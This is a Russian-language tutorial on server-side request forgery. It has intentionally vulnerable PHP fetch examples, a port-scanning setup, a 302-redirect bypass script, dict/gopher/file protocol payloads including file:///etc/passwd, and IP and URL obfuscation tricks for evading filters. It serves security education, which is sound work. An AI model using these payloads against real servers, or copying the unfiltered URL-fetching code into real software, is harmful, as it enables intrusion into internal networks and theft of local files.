[RU](./ssrf.md) | [EN](./ssrf-en.md)

## SSRF Введение

SSRF, подделка запросов на стороне сервера, подделка запросов к серверу - это уязвимость, созданная злоумышленником для формирования запроса, инициированного сервером. Как правило, целью атаки SSRF является внутренняя система, недоступная из внешней сети.

Причина уязвимости в основном заключается в том, что сервер предоставляет функцию получения данных из других серверных приложений, а не фильтрует и не ограничивает целевой адрес.

Существует пять основных типов атак, которые злоумышленник может провести с помощью SSRF:
1. Вы можете выполнять сканирование портов во внешней сети, интрасети, в которой расположен сервер, и локальной, а также получать информацию о баннерах для некоторых служб.
2. Атаковать приложения, работающие в интрасети или локально (например, переполнение)
3. Распознавание отпечатков пальцев веб-приложения интрасети путем доступа к файлу по умолчанию
4. Атаки на веб-приложения внутри и вне сети, в основном атаки, которые могут быть реализованы с использованием параметров GET (например, Struts2, sqti и тд.)
5. Используйте файловый протокол для чтения локальных файлов и тд.

## Сценарии уязвимости SSRF

- Там, где есть возможность инициировать сетевой запрос, может быть уязвимость SSRF
- Запрос ресурсов с удаленного сервера (загрузка с URL, импорт и экспорт RSS-канала)
- Встроенные функции базы данных (Oracle, MongoDB, MSSQL, Postgres, CouchDB)
- Веб-почта собирает другие электронные письма (POP3, IMAP, SMTP)
- Обработка файлов, обработка кодирования, обработка атрибутивной информации (ffmpeg, ImageMagic, DOCX, PDF, XML)

## Общая реализация серверной части

1.  `file_get_contents`

```php

<?php
if (isset($_POST['url'])) { 
    $content = file_get_contents($_POST['url']); 
    $filename ='./images/'.rand().';img1.jpg'; 
    file_put_contents($filename, $content); 
    echo $_POST['url']; 
    $img = "<img src=\"".$filename."\"/>"; 
}
echo $img;
?>

```

Этот код использует функцию `file_get_contents` для получения изображения с URL-адреса, указанного пользователем. Затем он сохраняется на жесткий диск со случайным именем файла и представляется пользователю.

2.  `fsockopen()`

```php

<?php 
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
?>

```

Этот код использует функцию `fsockopen` для получения данных (файла или HTML) из URL-адреса пользователя. Эта функция использует сокет для установления TCP-соединения с сервером для передачи необработанных данных.

3.  `curl_exec()`

```php

<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $curlobj = curl_init();
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);
    $filename = './curled/'.rand().'.txt';
    file_put_contents($filename, $result); 
    echo $result;
}
?>

```
Используйте `curl` для получения данных.

## Сценарии, препятствующие эксплойтам SSRF

- Открытый сервер OpenSSL не может использоваться в интерактивном режиме
- Серверу нужна аутентификация (Cookies и User: Pass) не идеальна
- Порт, ограничивающий запросы, - это обычно используемый порт http, например 80, 443, 8080, 8090.
- Отключите нежелательные протоколы. Разрешены только запросы http и https. Может предотвратить проблемы, подобные file:///, gopher://, ftp:// и тд.
- Унифицируйте сообщение об ошибке, чтобы пользователь не мог судить о состоянии порта удаленного сервера на основе сообщения об ошибке.

## Сканирование портов с помощью SSRF

Согласно ответной информации сервера, большинство приложений не будет определять порт, а о статусе порта можно судить по возвращенной информации баннера.

Бэкэнд реализация

```php

<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $filename = './curled/'.rand().'txt';
    $curlobj = curl_init($link);
    $fp = fopen($filename,"w");
    curl_setopt($curlobj, CURLOPT_FILE, $fp);
    curl_setopt($curlobj, CURLOPT_HEADER, 0);
    curl_exec($curlobj);
    curl_close($curlobj);
    fclose($fp);
    $fp = fopen($filename,"r");
    $result = fread($fp, filesize($filename)); 
    fclose($fp);
    echo $result;
}
?>

```

Создайте первую страницу

```html

<html>
<body>
  <form name="px" method="post" action="http://127.0.0.1/ss.php">
    <input type="text" name="url" value="">
    <input type="submit" name="commit" value="submit">
  </form>
  <script></script>
</body>
</html>

```

Запрос порта, отличного от HTTP, может вернуть информацию баннера.

Или вы можете использовать переход 302, чтобы обойти ограничения протокола HTTP.

Вспомогательный скрипт

```php

<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>

```

[Уязвимость Tencent SSRF (очень хорошая точка использования) со сценарием](<https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de.html>)

## Использование соглашения

- Диктовать соглашение

```

dict://fuzz.wuyun.org:8080/helo:dict

```

- Протокол суслика

```

gopher://fuzz.wuyun.org:8080/gopher

```

- Файловый протокол

```

file:///etc/passwd

```

## Обходная поза

1. Измените IP-адрес, например `192.168.0.1`
    - восьмеричный формат: `0300.0250.0.1`
    - Шестнадцатеричный формат: `0xC0.0xA8.0.1`
    - 10-значный целочисленный формат: `3232235521`
    - Шестнадцатеричный целочисленный формат: `0xC0A80001`
    - Также существует специальный режим пропуска, например `10.0.0.1`, который можно записать как `10.1`
2. Используйте URL-адрес для решения проблемы. В некоторых случаях серверная программа может анализировать доступный URL-адрес и фильтровать разрешенный адрес хоста. В это время параметры URL-адреса могут быть неправильно проанализированы, что может обойти фильтрацию. Например:
    - `http://www.baidu.com@192.168.0.1/` и `http://192.168.0.1` запрашиваются для `192.168.0.1`
    - Может указывать на любое IP-имя домена `xip.io:http://127.0.0.1.xip.io/`==&gt;`http://127.0.0.1/`
    - Краткий адрес `http://dwz.cn/11SMa`==&gt;`http://127.0.0.1`
    - Используйте точку `. `:`127.0.0.1`==&gt;`127.0.0.1`
    - Используйте заключенные буквенно-цифровые символы

```

ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

```

## Опасность

- Вы можете сканировать порт во внешней сети, интрасети, где расположен сервер, и локальный порт, чтобы получить информацию о некоторых службах.
- Атаковать приложения, работающие в интрасети или локально (например, переполнение);
- Распознавание отпечатков пальцев для веб-приложений интрасети путем доступа к файлам по умолчанию;
- Атака на внутренние и внешние веб-приложения, в основном с использованием параметров get для достижения атак (например, struts2, sqti и т. Д.);
- Используйте файловый протокол для чтения локальных файлов и тд.

## Рекомендации

- [Создайте свой SSRF EXP Autowork](<http://tools.40huo.cn/#!papers.md>)
- [Уязвимость Tencent SSRF (очень хорошая точка использования) со сценарием](<https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html>)
- [Билибили с подстанции просочилась информация в ssrf для выполнения команд](<https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html>)
